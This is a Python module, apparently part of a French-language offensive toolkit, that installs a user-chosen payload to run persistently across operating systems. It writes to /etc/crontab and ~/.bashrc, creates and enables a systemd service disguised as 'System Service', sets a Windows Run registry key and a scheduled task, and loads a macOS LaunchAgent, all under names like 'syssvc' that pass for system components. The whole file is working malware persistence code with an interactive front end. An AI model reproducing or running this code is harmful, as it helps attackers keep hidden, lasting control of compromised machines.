# -*- coding: utf-8 -*-
# Module 11 : persistance multi-méthodes
import os, sys, subprocess, platform, json, shutil
from datetime import datetime

class Persistence:
    def __init__(self, payload):
        self.payload = os.path.abspath(payload)
        self.results = {}

    def cron(self):
        try:
            with open("/etc/crontab","a") as f:
                f.write(f"@reboot root {self.payload}\n")
            self.results["cron"] = True
        except Exception as e:
            self.results["cron"] = str(e)

    def systemd(self):
        svc = f"""[Unit]
Description=System Service
[Service]
ExecStart={self.payload}
Restart=always
[Install]
WantedBy=multi-user.target
"""
        try:
            with open("/etc/systemd/system/sys-svc.service","w") as f:
                f.write(svc)
            subprocess.run(["systemctl","enable","sys-svc.service"],
                           stderr=subprocess.DEVNULL)
            self.results["systemd"] = True
        except Exception as e:
            self.results["systemd"] = str(e)

    def bashrc(self):
        try:
            with open(os.path.expanduser("~/.bashrc"),"a") as f:
                f.write(f"\nnohup {self.payload} >/dev/null 2>&1 &\n")
            self.results["bashrc"] = True
        except Exception as e:
            self.results["bashrc"] = str(e)

    def registry(self):
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            sub = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, sub, 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "syssvc", 0, winreg.REG_SZ, self.payload)
            self.results["registry"] = True
        except Exception as e:
            self.results["registry"] = str(e)

    def schtasks(self):
        try:
            subprocess.run(["schtasks","/create","/tn","syssvc",
                            "/tr",self.payload,"/sc","onlogon","/f"],
                           stderr=subprocess.DEVNULL)
            self.results["schtasks"] = True
        except Exception as e:
            self.results["schtasks"] = str(e)

    def launchagent(self):
        plist = f"""<?xml version="1.0"?>
<plist version="1.0"><dict>
<key>Label</key><string>syssvc</string>
<key>ProgramArguments</key><array><string>{self.payload}</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
"""
        try:
            path = os.path.expanduser("~/Library/LaunchAgents/syssvc.plist")
            with open(path,"w") as f: f.write(plist)
            subprocess.run(["launchctl","load",path], stderr=subprocess.DEVNULL)
            self.results["launchagent"] = True
        except Exception as e:
            self.results["launchagent"] = str(e)

    def install_all(self):
        s = platform.system()
        if s == "Linux":
            self.cron(); self.systemd(); self.bashrc()
        elif s == "Windows":
            self.registry(); self.schtasks()
        elif s == "Darwin":
            self.launchagent()
        os.makedirs("output", exist_ok=True)
        with open("output/persistence_report.json","w",encoding="utf-8") as f:
            json.dump(self.results, f, indent=2)
        return self.results

def run_interactive():
    from toolkit import ok, err, info, section, ask, confirm
    section("PERSISTANCE MULTI-OS")
    info(f"Système : {platform.system()}")
    p = ask("Chemin du payload à exécuter au démarrage")
    if not os.path.exists(p):
        err("Fichier introuvable"); return
    if not confirm(f"Installer la persistance pour {p} ?"): return
    r = Persistence(p).install_all()
    for method, status in r.items():
        if status is True: ok(f"{method} installé")
        else: err(f"{method} : {status}")
    ok("Rapport : output/persistence_report.json")